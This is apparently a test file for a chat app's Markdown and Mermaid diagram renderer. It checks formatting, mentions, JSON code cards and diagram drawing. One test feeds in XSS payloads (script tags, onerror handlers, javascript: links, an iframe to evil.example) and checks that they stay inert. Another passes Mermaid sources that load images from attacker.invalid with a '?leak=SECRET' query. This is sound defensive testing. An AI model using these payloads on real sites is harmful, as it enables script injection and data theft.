import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, test } from "bun:test";
import { setupDom } from "@agenteschat/ui/testing/dom";

setupDom();

import { readFileSync } from "node:fs";
import { join } from "node:path";
import { act, cleanup, fireEvent, render, within } from "@testing-library/react";
import { Glob } from "bun";
import { MessageBody } from "@/chat/MessageBody";
import { setMermaidRenderer } from "@/components/artifacts/Mermaid";
import { createI18n } from "@/i18n";
import { codeAndBold, inlineWords, Markdown, renderInline } from "@/lib/markdown";
import { ADA_ID, createFakeApi, ENG_ID, ORG_ID, seedState } from "./fake-api";
import { renderApp, screen, settle } from "./render";

afterEach(() => cleanup());

const body = (text: string, resolve?: (h: string) => string | null) =>
  render(<MessageBody body={text} resolveMention={resolve} />).container;

describe("message Markdown", () => {
  test("bold, italic, inline code, code blocks, lists, links and line breaks", () => {
    const el = body(
      [
        "**Subir pra produção:** depois das 18h, _sem pressa_.",
        "Primeira linha",
        "segunda linha",
        "",
        "- rodar `bun test`",
        "- conferir o [painel](https://status.acme.com)",
        "",
        "1. build",
        "2. deploy",
        "",
        "```ts",
        "const x = **not bold**;",
        "```",
        "Veja https://acme.com/a_b_c.",
      ].join("\n"),
    );
    expect(el.querySelector("strong")?.textContent).toBe("Subir pra produção:");
    expect(el.textContent).not.toContain("**Subir");
    expect(el.querySelector("em")?.textContent).toBe("sem pressa");
    // Line breaks inside a paragraph are kept (shown by white-space: pre-wrap).
    expect(
      Array.from(el.querySelectorAll("p")).some((p) => p.textContent?.includes("Primeira linha\nsegunda linha")),
    ).toBe(true);
    expect(Array.from(el.querySelectorAll("ul li")).map((li) => li.textContent)).toEqual([
      "rodar bun test",
      "conferir o painel",
    ]);
    expect(el.querySelector("ul li code")?.textContent).toBe("bun test");
    expect(el.querySelectorAll("ol li")).toHaveLength(2);
    // Code blocks stay literal, in mono.
    expect(el.querySelector("pre code")?.textContent).toBe("const x = **not bold**;");
    const links = Array.from(el.querySelectorAll("a"));
    expect(links.map((a) => a.getAttribute("href"))).toEqual(["https://status.acme.com", "https://acme.com/a_b_c"]);
    for (const a of links) expect(a.getAttribute("rel")).toBe("noopener noreferrer");
    // URLs and snake_case are never turned into italics.
    expect(el.querySelectorAll("em")).toHaveLength(1);
  });

  test("@mentions become our mention chips, not inside code or emails", () => {
    const el = body("@ada olha `@atlas` e fala com joao@acme.com, **@theo**", (h) =>
      h === "ada" ? "Ada" : h === "theo" ? "Theo" : null,
    );
    const mentions = Array.from(el.querySelectorAll(".ac-mention")).map((m) => m.textContent);
    expect(mentions).toEqual(["@Ada", "@Theo"]);
    expect(el.querySelector("code")?.textContent).toBe("@atlas");
    expect(el.textContent).toContain("joao@acme.com");
  });

  test("a handle of no one in the workspace stays plain text; @todos stays a mention", () => {
    const el = body("o @fulano do X sugeriu, @ada e @todos", (h) => (h === "ada" ? "Ada" : null));
    expect([...el.querySelectorAll(".ac-mention")].map((m) => m.textContent)).toEqual(["@Ada", "@todos"]);
    expect(el.textContent).toBe("o @fulano do X sugeriu, @Ada e @todos");
  });

  test("XSS attempts stay inert text", () => {
    const attacks = [
      '<img src=x onerror="alert(1)">',
      "<script>alert(1)</script>",
      "[clique](javascript:alert(1))",
      "[dados](data:text/html,<script>alert(1)</script>)",
      '<a href="javascript:alert(1)">x</a>',
      "**<iframe src=//evil.example>**",
      "```\n</code></pre><script>alert(1)</script>\n```",
    ].join("\n\n");
    const el = body(attacks);
    for (const tag of ["img", "script", "iframe"]) expect(el.querySelector(tag)).toBeNull();
    for (const a of Array.from(el.querySelectorAll("a"))) {
      expect(a.getAttribute("href") ?? "").toMatch(/^(https?:|mailto:)/);
    }
    // No element got an event-handler attribute.
    for (const node of Array.from(el.querySelectorAll("*"))) {
      for (const attr of Array.from(node.attributes)) expect(attr.name.startsWith("on")).toBe(false);
    }
    expect(el.textContent).toContain("<script>alert(1)</script>");
    expect(el.textContent).toContain("[clique](javascript:alert(1))");
    expect(el.querySelector("strong")?.textContent).toBe("<iframe src=//evil.example>");
  });

  test("a table scrolls inside its box, which says which side has more columns (that side fades)", () => {
    const el = body(["| Destino | Hoje | 7 dias |", "| --- | ---: | ---: |", "| Paris | 14 | 129 |"].join("\n"));
    const box = el.querySelector(".md--message > .md__table") as HTMLElement;
    const scroller = box.querySelector(":scope > .md__table-scroll") as HTMLElement;
    expect(scroller.querySelector(":scope > table th")?.textContent).toBe("Destino");
    // Fits: no side fades.
    expect(box.dataset.more).toBeUndefined();
    // Wider than the message: more at the end, then at both sides, then only at the start.
    const size = (scrollLeft: number) => {
      for (const [k, v] of Object.entries({ clientWidth: 300, scrollWidth: 500, scrollLeft })) {
        Object.defineProperty(scroller, k, { configurable: true, value: v });
      }
      fireEvent.scroll(scroller);
    };
    size(0);
    expect(box.dataset.more).toBe("end");
    size(100);
    expect(box.dataset.more).toBe("both");
    size(200);
    expect(box.dataset.more).toBe("start");
  });

  test("renderInline without a mention renderer keeps @ as text", () => {
    const { container } = render(<p>{renderInline("oi @ada")}</p>);
    expect(container.textContent).toBe("oi @ada");
    expect(container.querySelector(".ac-mention")).toBeNull();
  });
});

describe("in the channel", () => {
  test("agent and people messages render Markdown", async () => {
    const state = seedState();
    state.messages.push(
      {
        id: "m-md-1",
        channelId: ENG_ID,
        threadId: null,
        author: { type: "agent", id: ADA_ID },
        body: "**Subir pra produção:**\n- migrar o banco\n- trocar a flag",
        mentionedAgentIds: [],
        agentRunId: "r-md",
        createdAt: new Date().toISOString(),
      },
      {
        id: "m-md-2",
        channelId: ENG_ID,
        threadId: null,
        author: { type: "person", id: "u-joao" },
        body: "Combinado, *amanhã* cedo @ada",
        mentionedAgentIds: [ADA_ID],
        agentRunId: null,
        createdAt: new Date().toISOString(),
      },
    );
    await renderApp(`/org/${ORG_ID}/c/${ENG_ID}`, { api: createFakeApi(state) });
    await settle(6);
    const rows = screen().getAllByRole("article");
    const agent = rows.find((r) => r.textContent?.includes("Subir pra produção:")) as HTMLElement;
    expect(agent.querySelector("strong")?.textContent).toBe("Subir pra produção:");
    expect(agent.textContent).not.toContain("**");
    expect(agent.querySelectorAll("li")).toHaveLength(2);
    const person = rows.find((r) => r.textContent?.includes("Combinado")) as HTMLElement;
    expect(person.querySelector("em")?.textContent).toBe("amanhã");
    expect(person.querySelector(".ac-mention")?.textContent).toBe("@Ada");
  });
});

describe("```json fences", () => {
  beforeAll(() => createI18n("pt-BR"));
  const RAW = '{"key":"infra-incident-ledger","timezone":"America/Sao_Paulo","reads":[1,2]}';
  const PRETTY = [
    "{",
    '  "key": "infra-incident-ledger",',
    '  "timezone": "America/Sao_Paulo",',
    '  "reads": [',
    "    1,",
    "    2",
    "  ]",
    "}",
  ].join("\n");

  test("a JSON block reads formatted and wrapped; Original shows it as written; copy takes what shows", async () => {
    const copied: string[] = [];
    Object.defineProperty(navigator, "clipboard", {
      configurable: true,
      value: { writeText: async (text: string) => void copied.push(text) },
    });
    const el = body(`O registro:\n\n\`\`\`json\n${RAW}\n\`\`\``);
    const card = el.querySelector(".code-card") as HTMLElement;
    const code = () => card.querySelector(".code-card__code") as HTMLElement;
    expect(code().textContent).toBe(PRETTY);
    expect(code().dataset.wrap).toBe("true");
    // A wrapped line goes on under its own indent; keys apart from the strings.
    const line = code().querySelectorAll<HTMLElement>(".code-line")[1];
    expect(line?.style.getPropertyValue("--hang")).toBe("2ch");
    expect(line?.querySelector(".code-tok--property")?.textContent).toBe('"key"');
    // The copy button reads "Copiado" for a moment after a copy: found by its place, not its name.
    const copy = card.querySelector(".code-card__copy") as HTMLElement;
    expect(copy.getAttribute("aria-label")).toBe("Copiar");
    await act(async () => fireEvent.click(copy));
    const original = within(card).getByRole("button", { name: "Original" });
    await act(async () => fireEvent.click(original));
    expect(original.getAttribute("aria-pressed")).toBe("true");
    expect(code().textContent).toBe(RAW);
    expect(code().dataset.wrap).toBeUndefined();
    await act(async () => fireEvent.click(copy));
    expect(copied).toEqual([PRETTY, RAW]);
  });

  test("JSON already formatted, or a block that isn't JSON, has no Original to switch to", () => {
    const el = body(`\`\`\`json\n${PRETTY}\n\`\`\`\n\n\`\`\`json\n{nope\n\`\`\``);
    const [pretty, broken] = Array.from(el.querySelectorAll<HTMLElement>(".code-card")) as [HTMLElement, HTMLElement];
    expect(pretty.querySelector("button[aria-pressed]")).toBeNull();
    expect((pretty.querySelector(".code-card__code") as HTMLElement).dataset.wrap).toBe("true");
    expect(broken.querySelector("button[aria-pressed]")).toBeNull();
    expect(broken.querySelector(".code-card__code")?.textContent).toBe("{nope");
  });
});

describe("```mermaid fences", () => {
  /** The sources the page asked to draw (the fake stands in for mermaid, which needs a browser's layout). */
  const asked: string[] = [];
  beforeAll(() => createI18n("pt-BR"));
  afterAll(() => setMermaidRenderer(null));
  beforeEach(() => {
    asked.length = 0;
    // Set again for each test: that also forgets what the last test drew.
    setMermaidRenderer(async (_id, source) => {
      asked.push(source);
      if (source.includes("-->>")) throw new Error("Parse error on line 2");
      return `<svg xmlns="http://www.w3.org/2000/svg" width="100%" style="max-width: 640px;" viewBox="-8 -8 640 120"><text>${source.length}</text></svg>`;
    });
  });

  const FLOW = "flowchart LR\n  A[Pedido] --> B{Aprovado?}\n  B -- sim --> C[Deploy]";
  const fence = (source: string) => `\`\`\`mermaid\n${source}\n\`\`\``;
  const svgOf = (img: Element | null) => {
    const src = img?.getAttribute("src") ?? "";
    return decodeURIComponent(src.slice(src.indexOf(",") + 1));
  };

  test("drawn in its code card at its own size; Código shows the source, copy stays", async () => {
    const el = render(<Markdown source={`O fluxo:\n\n${fence(FLOW)}`} />).container;
    await settle();
    const img = el.querySelector(".code-card__preview img");
    expect(img?.getAttribute("alt")).toBe("Diagrama");
    expect(img?.getAttribute("src")?.startsWith("data:image/svg+xml")).toBe(true);
    // Its own size, not its box's width ("100%"); the card fits it down to 60% of that (`--w`), then it scrolls.
    expect(svgOf(img)).toMatch(/^<svg [^>]*width="640"[^>]* height="120"/);
    expect((img as HTMLElement).style.getPropertyValue("--w")).toBe("640px");
    expect(el.querySelector(".code-card__code")).toBeNull();
    const card = el.querySelector(".code-card") as HTMLElement;
    expect(card.querySelector(".code-card__lang")?.textContent).toBe("Mermaid");
    expect(within(card).getByRole("button", { name: "Copiar" })).toBeTruthy();
    const code = within(card).getByRole("button", { name: "Código" });
    await act(async () => fireEvent.click(code));
    expect(code.getAttribute("aria-pressed")).toBe("true");
    expect(card.querySelector(".code-card__preview")).toBeNull();
    expect(card.querySelector(".code-card__code")?.textContent).toBe(FLOW);
    expect(asked).toEqual([FLOW]);
  });

  test("one that doesn't parse stays a code block: no image, no error", async () => {
    const bad = "sequenceDiagram\n  Ana-->>";
    const el = render(<MessageBody body={`Tentei:\n\n${fence(bad)}`} />).container;
    await settle();
    expect(asked).toEqual([bad]);
    expect(el.querySelector("img")).toBeNull();
    expect(el.querySelector(".code-card__code")?.textContent).toBe(bad);
    expect(within(el).queryByRole("button", { name: "Código" })).toBeNull();
    expect(el.querySelector(".artifact-diagram")).toBeNull();
    expect(el.textContent).not.toContain("Não foi possível");
  });

  /** What the fake drew for a source, as found in the image. */
  const drawingOf = (source: string) => `<text>${source.length}</text>`;
  const shown = (el: Element) => svgOf(el.querySelector(".code-card__preview img"));
  const pause = (ms: number) => act(() => new Promise<void>((resolve) => setTimeout(resolve, ms)));

  test("typing in a diagram keeps its last drawing on screen and draws again once the typing stops", async () => {
    const view = render(<Markdown source={fence(FLOW)} />);
    await settle();
    const el = view.container;
    for (const typed of ["!", "!!", "!!!"]) {
      view.rerender(<Markdown source={fence(`${FLOW}${typed}`)} />);
      await settle();
      expect(shown(el)).toContain(drawingOf(FLOW));
      expect(el.querySelector(".code-card__code")).toBeNull();
    }
    await pause(350);
    await settle();
    expect(shown(el)).toContain(drawingOf(`${FLOW}!!!`));
    expect(asked).toEqual([FLOW, `${FLOW}!!!`]);
  });

  test("a diagram drawn before keeps its drawing while an edit that doesn't parse is typed", async () => {
    // Read first, then opened side by side: the preview mounts with its drawing already made.
    const read = render(<Markdown source={fence(FLOW)} />);
    await settle();
    read.unmount();
    const view = render(<Markdown source={fence(FLOW)} />);
    const el = view.container;
    const typed = FLOW.replace("-->", "-->>");
    view.rerender(<Markdown source={fence(typed)} />);
    await settle();
    expect(shown(el)).toContain(drawingOf(FLOW));
    expect(el.querySelector(".code-card__code")).toBeNull();
    expect(asked).toEqual([FLOW]);
    // Once the typing stops it's drawn, and what doesn't parse shows as code.
    await pause(350);
    await settle();
    expect(asked).toEqual([FLOW, typed]);
    expect(el.querySelector(".code-card__code")?.textContent).toBe(typed);
  });

  test("drawings waiting their turn are dropped when their block is gone", async () => {
    const waiting: (() => void)[] = [];
    setMermaidRenderer(
      (_id, source) =>
        new Promise((resolve) => {
          asked.push(source);
          waiting.push(() => resolve(`<svg xmlns="http://www.w3.org/2000/svg">${drawingOf(source)}</svg>`));
        }),
    );
    const sources = ["flowchart LR\n  A --> B", "flowchart LR\n  C --> D", "flowchart LR\n  E --> F"];
    const view = render(<Markdown source={sources.map(fence).join("\n\n")} />);
    await settle();
    // The first is being drawn and the others wait behind it when the page is left.
    expect(asked).toEqual([sources[0] ?? ""]);
    view.unmount();
    for (const done of waiting) done();
    await settle();
    expect(asked).toEqual([sources[0] ?? ""]);
  });

  test("the same diagram twice on a page is drawn once", async () => {
    const el = render(<Markdown source={`${fence(FLOW)}\n\nDe novo:\n\n${fence(FLOW)}`} />).container;
    await settle();
    expect(el.querySelectorAll(".code-card__preview img")).toHaveLength(2);
    expect(asked).toEqual([FLOW]);
  });

  test("switching theme keeps the drawing on screen until the other theme's is ready", async () => {
    setMermaidRenderer(async (_id, source, dark) => {
      asked.push(`${dark ? "dark" : "light"}: ${source}`);
      return `<svg xmlns="http://www.w3.org/2000/svg"><text>${dark ? "dark" : "light"}</text></svg>`;
    });
    const el = render(<Markdown source={fence(FLOW)} />).container;
    await settle();
    expect(shown(el)).toContain("<text>light</text>");
    const html = document.documentElement;
    try {
      await act(async () => {
        html.dataset.theme = "dark";
      });
      await settle();
      expect(shown(el)).toContain("<text>light</text>");
      await pause(350);
      await settle();
      expect(shown(el)).toContain("<text>dark</text>");
      expect(asked).toEqual([`light: ${FLOW}`, `dark: ${FLOW}`]);
    } finally {
      await act(async () => {
        delete html.dataset.theme;
      });
    }
  });

  test("the diagram's accTitle and accDescr name and describe its image", async () => {
    setMermaidRenderer(
      async () =>
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 80"><title id="chart-title-mmd-1">Fluxo de deploy</title><desc id="chart-desc-mmd-1">Do pedido &amp; aprovação ao deploy</desc><g><title>nó</title></g></svg>',
    );
    const el = render(<Markdown source={fence(`${FLOW}\n  accTitle: Fluxo de deploy`)} />).container;
    await settle();
    const img = el.querySelector(".code-card__preview img");
    expect(img?.getAttribute("alt")).toBe("Fluxo de deploy");
    expect(img?.getAttribute("aria-description")).toBe("Do pedido & aprovação ao deploy");
  });

  test("a diagram goes to mermaid as written: nothing is refused for what it says", async () => {
    // What would load is for mermaid's frame to stop (lib/mermaid.ts), so these draw like any other.
    const sources = [
      'flowchart TD\n  A@{ img: "https://attacker.invalid/p.png?leak=SECRET" }',
      `%%{init: {"themeCSS": ".node rect { fill: url(https://attacker.invalid/p.png) }"}}%%\n${FLOW}`,
      "flowchart LR\n  A[getSignedUrl(x)] --> B[S3]",
    ];
    const el = render(<Markdown source={sources.map(fence).join("\n\n")} />).container;
    await settle(sources.length * 3);
    expect(asked).toEqual(sources);
    expect(el.querySelectorAll(".code-card__preview img")).toHaveLength(sources.length);
  });

  test("one longer than the page sends mermaid, with front matter mermaid refuses or too many lines stays code", async () => {
    const sources = [
      `flowchart LR\n  A[${"x".repeat(50_000)}] --> B`,
      // Front matter that never closes.
      `---\n${"title: x\n".repeat(5000)}flowchart LR\n  A --> B`,
      `flowchart LR\n${"\n".repeat(1001)}  A --> B`,
    ];
    const el = render(<Markdown source={sources.map(fence).join("\n\n")} />).container;
    await settle();
    expect(asked).toEqual([]);
    expect(Array.from(el.querySelectorAll(".code-card__code"), (code) => code.textContent)).toEqual(sources);
  });

  test("one mermaid can't draw is sent once: shown again, it stays code without asking again", async () => {
    const bad = "sequenceDiagram\n  Ana-->>";
    const first = render(<MessageBody body={fence(bad)} />);
    await settle();
    first.unmount();
    const el = render(<MessageBody body={fence(bad)} />).container;
    await settle();
    expect(el.querySelector(".code-card__code")?.textContent).toBe(bad);
    expect(asked).toEqual([bad]);
  });

  test("a drawing too big to show stays code, and isn't asked for again", async () => {
    // 10,000,000 of a flowchart's own spacing made a card 12,000,000 px tall.
    setMermaidRenderer(async (_id, source) => {
      asked.push(source);
      return '<svg xmlns="http://www.w3.org/2000/svg" width="100%" viewBox="0 0 760 12000097"><g/></svg>';
    });
    const first = render(<MessageBody body={fence(FLOW)} />);
    await settle();
    first.unmount();
    const el = render(<MessageBody body={fence(FLOW)} />).container;
    await settle();
    expect(el.querySelector("img")).toBeNull();
    expect(el.querySelector(".code-card__code")?.textContent).toBe(FLOW);
    expect(within(el).queryByRole("button", { name: "Código" })).toBeNull();
    expect(asked).toEqual([FLOW]);
  });

  test("where mermaid would draw on the page's thread a fence waits for Ver diagrama, and is drawn when pressed", async () => {
    setMermaidRenderer(async (_id, source) => {
      asked.push(source);
      return `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 120">${drawingOf(source)}</svg>`;
    }, false);
    const other = "flowchart LR\n  X --> Y";
    const el = render(<MessageBody body={`Dois:\n\n${fence(FLOW)}\n\n${fence(other)}`} />).container;
    await settle();
    expect(asked).toEqual([]);
    expect(Array.from(el.querySelectorAll(".code-card__code"), (code) => code.textContent)).toEqual([FLOW, other]);
    const [first] = within(el).getAllByRole("button", { name: "Ver diagrama" });
    await act(async () => fireEvent.click(first as HTMLElement));
    await settle();
    expect(asked).toEqual([FLOW]);
    expect(shown(el)).toContain(drawingOf(FLOW));
    expect(within(el).getAllByRole("button", { name: "Ver diagrama" })).toHaveLength(1);
    // Shown again (the message's row replaced), the drawing made is there at once.
    const again = render(<MessageBody body={fence(FLOW)} />).container;
    expect(shown(again)).toContain(drawingOf(FLOW));
    expect(within(again).queryByRole("button", { name: "Ver diagrama" })).toBeNull();
  });

  test("a page with no mermaid fence never loads mermaid", async () => {
    render(<Markdown source={"# Notas\n\nTexto.\n\n```ts\nconst a = 1;\n```\n\n- item"} />);
    render(<MessageBody body={"Oi **time**\n\n```\nflowchart LR\n  A --> B\n```"} />);
    await settle();
    expect(asked).toEqual([]);
    expect(document.querySelector("img")).toBeNull();
    // No code of mermaid's is in the app: only its bundle's address, which the frame loads when a diagram is drawn.
    const src = join(import.meta.dir, "..", "src");
    const imported = [...new Glob("**/*.{ts,tsx}").scanSync(src)].filter((f) =>
      /\bimport\b[^;]*?["']mermaid(?:\/[^"'?]*)?["']/.test(readFileSync(join(src, f), "utf8")),
    );
    expect(imported).toEqual([]);
  });
});

describe("an agent's words on a card", () => {
  test("code between backticks is one inline code look, bold stays bold; inside a control no link is drawn", () => {
    const { container } = render(
      <div>
        <p>{inlineWords("Rodei `bun test` e **passou**, veja https://example.com/run")}</p>
        <button type="button">{codeAndBold("Usar `pnpm` **agora** em https://example.com")}</button>
      </div>,
    );
    const [said, option] = [container.querySelector("p"), container.querySelector("button")] as HTMLElement[];
    expect(said?.querySelector("code.ac-inlinecode")?.textContent).toBe("bun test");
    expect(said?.querySelector("strong")?.textContent).toBe("passou");
    expect(said?.querySelector("a")?.getAttribute("href")).toBe("https://example.com/run");
    expect(option?.querySelector("code.ac-inlinecode")?.textContent).toBe("pnpm");
    expect(option?.querySelector("b")?.textContent).toBe("agora");
    expect(option?.querySelector("a")).toBeNull();
    expect(option?.textContent).toBe("Usar pnpm agora em https://example.com");
    // Words already drawn pass through as they are.
    expect(inlineWords(<i>já</i>)).toEqual(<i>já</i>);
  });
});
